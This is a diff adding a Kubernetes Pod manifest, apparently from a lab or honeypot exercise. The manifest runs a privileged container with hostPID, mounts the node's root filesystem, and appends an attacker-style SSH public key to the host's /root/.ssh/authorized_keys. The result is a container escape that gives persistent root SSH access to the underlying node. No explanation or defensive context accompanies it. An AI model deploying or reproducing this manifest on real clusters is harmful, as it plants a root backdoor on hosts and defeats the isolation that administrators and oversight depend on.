@@ -1,0 +1,28 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: add-cluster-key
+  namespace: group-5
+spec:
+  hostPID: true
+  restartPolicy: Never
+  containers:
+    - name: add-key
+      image: alpine
+      command:
+        - sh
+        - -c
+        - |
+          mkdir -p /host/root/.ssh
+          echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB/N9QhdRsv4hU7sP6idsr8hDM4WUvU6ZcKDvg48B8t1 cyske@cyske-lab-honeypot" >> /host/root/.ssh/authorized_keys
+          chmod 600 /host/root/.ssh/authorized_keys
+          echo "DONE"
+      securityContext:
+        privileged: true
+      volumeMounts:
+        - name: host
+          mountPath: /host
+  volumes:
+    - name: host
+      hostPath:
+        path: /
